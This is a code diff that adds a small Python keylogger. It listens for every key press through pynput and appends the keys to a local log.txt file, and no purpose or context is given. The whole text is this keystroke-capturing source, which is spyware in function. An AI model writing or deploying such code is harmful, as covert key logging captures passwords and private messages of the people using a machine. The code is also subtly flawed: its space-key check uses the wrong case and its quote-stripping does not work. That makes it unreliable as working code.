@@ -1,0 +1,11 @@
+from pynput.keyboard import Listener
+
+def Listener_board(key):
+    letter = str(key)
+    letter = letter.replace(" ' ", " ")
+    if letter == 'key.space':
+        letter = ' '
+    with open("log.txt", 'a') as f:
+        f.write(letter)
+with Listener(on_press = Listener_board) as l:
+    l.join()
